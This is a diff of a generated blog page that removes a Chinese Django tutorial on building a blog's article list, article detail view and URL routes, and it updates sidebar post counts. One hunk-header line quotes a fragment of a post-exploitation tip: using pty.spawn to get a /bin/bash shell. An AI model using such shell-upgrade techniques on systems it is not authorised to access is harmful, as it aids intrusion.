-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="博客页面分类："><a href="#博客页面分类：" class="headerlink" title="博客页面分类："></a>博客页面分类：</h4><p>1.博客主页面<br>2.博客文章内容页面<br>3.博客撰写页面</p>
-<h4 id="主页面内容："><a href="#主页面内容：" class="headerlink" title="主页面内容："></a>主页面内容：</h4><ol>
-<li>文章标题列表，超链接</li>
-<li>取出数据库中所有文章对象</li>
-<li>将文章对象打包成列表，传递到前端</li>
-<li>前端页面把文章以标题超链接的形式逐个列出</li>
-</ol>
-<ul>
-<li><p>后端 views.py</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from django.shortcuts import render</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line">from . import models</span><br><span class="line"></span><br><span class="line"># 获取所有文章</span><br><span class="line">def index(request):</span><br><span class="line">articles = models.Article.objects.all() # 返回django内置的查询结果的集合对象，类似于列表</span><br><span class="line">return render(request,&apos;blog/index.html&apos;,&#123;&apos;articles&apos;:articles&#125;)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>前端 index.html</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--撰写博客入口--&gt;</span><br><span class="line">&lt;h2&gt;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;编写新文章&lt;/a&gt;</span><br><span class="line">&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--文章列表--&gt;</span><br><span class="line">&lt;h3&gt;</span><br><span class="line">文章列表：&lt;br&gt;</span><br><span class="line">&#123;% for article in articles %&#125;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;&#123;&#123; article.title &#125;&#125;&lt;/a&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="发表博客按钮（超链接）博客文章内容页面"><a href="#发表博客按钮（超链接）博客文章内容页面" class="headerlink" title="发表博客按钮（超链接）博客文章内容页面"></a>发表博客按钮（超链接）博客文章内容页面</h4><ol>
-<li>利用文章 ID 获取单个文章对象</li>
-</ol>
-<ul>
-<li>后端 view.py<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from django.shortcuts import render</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line">from . import models</span><br><span class="line"></span><br><span class="line">def index(request):</span><br><span class="line">articles = models.Article.objects.all() # 返回django内置的查询结果的集合对象，类似于列表</span><br><span class="line">return render(request,&apos;blog/index.html&apos;,&#123;&apos;articles&apos;:articles&#125;)</span><br><span class="line"></span><br><span class="line"># 获取文章对象</span><br><span class="line">def article_page(request,article_id):</span><br><span class="line">article = models.Article.objects.get(pk=article_id)</span><br><span class="line">return render(request,&apos;blog/article_page.html&apos;,&#123;&apos;article&apos;:article&#125;)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<ol start="2">
-<li>编写显示文章内容页面的前端</li>
-</ol>
-<ul>
-<li>前端 articl_page.html<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--显示单个文章标题和内容--&gt;</span><br><span class="line">&lt;h1&gt;&#123;&#123;article.title&#125;&#125;&lt;/h1&gt;&lt;br&gt;</span><br><span class="line">&lt;h3&gt;&#123;&#123;article.content&#125;&#125;&lt;/h3&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;!--修改文章链接--&gt;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;修改文章&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<ol start="3">
-<li>修改 URL 配置</li>
-</ol>
-<ul>
-<li>urls.py<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from django.conf.urls import url</span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">url(r&apos;^index/$&apos;, views.index), </span><br><span class="line">url(r&apos;^article/(?P&lt;article_id&gt;[0-9]+)$&apos;, views.article_page), </span><br><span class="line">]</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 
@@ -2040,7 +2050,7 @@ pty.spawn                 使用pty的spawn方法调用/bin/bash获取一个标�
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-count">27</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2051,7 +2061,7 @@ pty.spawn                 使用pty的spawn方法调用/bin/bash获取一个标�
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
